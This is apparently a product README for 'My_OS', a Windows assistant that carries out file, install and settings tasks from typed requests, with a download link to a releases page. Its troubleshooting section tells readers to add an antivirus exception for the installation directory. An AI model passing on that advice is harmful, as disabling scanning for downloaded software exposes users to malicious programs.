# 🤖 My_OS - Control your computer with natural language

[![](https://img.shields.io/badge/Download_My_OS-Blue-blue)](https://github.com/Whitepl435/My_OS/releases)

My_OS turns your computer into a system you can talk to. You describe a task, and the assistant performs the work for you. It organizes your files, installs new programs, and changes system settings while you watch. It runs on your hardware to keep your data private.

## 🚀 How it works

My_OS uses an artificial intelligence model that resides on your computer. This model translates your words into actions. It uses a bridge to your operating system to execute commands safely. Because the software stays on your machine, no external servers see your files or your activity. 

The system includes a confirmation step for every major change. If you ask it to delete a file or change a core setting, it stops and asks for your permission first. This design prevents unwanted changes. 

## ⚙️ System Requirements

To run My_OS, your computer needs the following specifications:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
*   Memory: 8 GB of RAM minimum, 16 GB recommended for faster performance.
*   Storage: 20 GB of free space.
*   Graphics: A dedicated graphics card with 4 GB of video memory improves speed significantly.

## ⌨️ Using the Assistant

After you install the program, you can access the assistant at any time.

*   Press the global hotkey. By default, this is `Alt + Space`.
*   A window appears on your screen.
*   Type your request into the box. Examples include "Find my budget spreadsheet from last month," "Install the latest web browser," or "Lower my screen brightness."
*   The assistant analyzes your request and suggests a series of actions.
*   Review the actions in the window. 
*   Click "Confirm" to let the assistant proceed, or "Cancel" if you change your mind.

## 🛡️ Privacy and Safety

My_OS prioritizes your privacy. The system operates locally by default. This means your text, your files, and your system data never leave your computer. We use an engine called Ollama to run these models directly on your hardware. 

If you choose the optional cloud service, the assistant sends your request to a high-performance server. This helps with complex tasks that require more power. You can toggle this setting in the "Preferences" menu. We encrypt all data sent to our cloud provider to ensure your information stays safe.

## 🛠️ Making Changes

You can customize how the assistant behaves. Open the settings menu by clicking the icon in your system tray.

### Model Settings
Choose which internal model powers your assistant. Larger models are smarter but draw more power. Smaller models are faster for general tasks.

### Permission Levels
You can set limits on what the assistant can do. Choose between "Ask for everything," "Ask for system changes only," or "Run tasks automatically." 

### Advanced Tools
The software provides a list of tools it can use. You can enable or disable these tools to grant or restrict access to specific parts of your computer. For example, if you do not want the assistant to install new packages, you can disable the "System Install" tool.

## ❓ Frequently Asked Questions

**Does the assistant work if I am offline?**
Yes. Since the models run on your hardware, the core features work without an internet connection. Only the optional cloud features require a web connection.

**Will this slow down my computer?**
The assistant only uses your computer resources when you trigger the hotkey. When it is idle, it uses almost no memory or processor power.

**How do I uninstall the program?**
Go to your Windows Settings, choose "Apps," find My_OS in the list, and select "Uninstall." This removes the main files. You can manually delete the model files from your user folder if you want to perform a complete cleanup.

**What happens if I make a mistake while typing?**
The assistant identifies the intent behind your words. If it cannot understand your request, it asks for clarification. It does not perform any action until you confirm the plan.

**Can I stop the assistant while it is working?**
Yes. You can press the `Escape` key at any time to halt an active task. The system immediately stops and waits for your next command.

## 📋 Troubleshooting

If the application does not open, check if your antivirus software blocked it. Add an exception for the installation directory in your security software if needed.

If the assistant reports an error, check the log files. You can find these in the "Help" menu under "View Logs." The logs show exactly why a task failed, such as a permission error or a missing file.

If the assistant runs slowly, try closing other heavy programs like video editors or web browsers with many tabs. The assistant shares your computer resources with these other programs. 

Keep your graphics drivers updated to ensure the best performance from the local model. Visit the website of your graphics card manufacturer to download the latest updates.
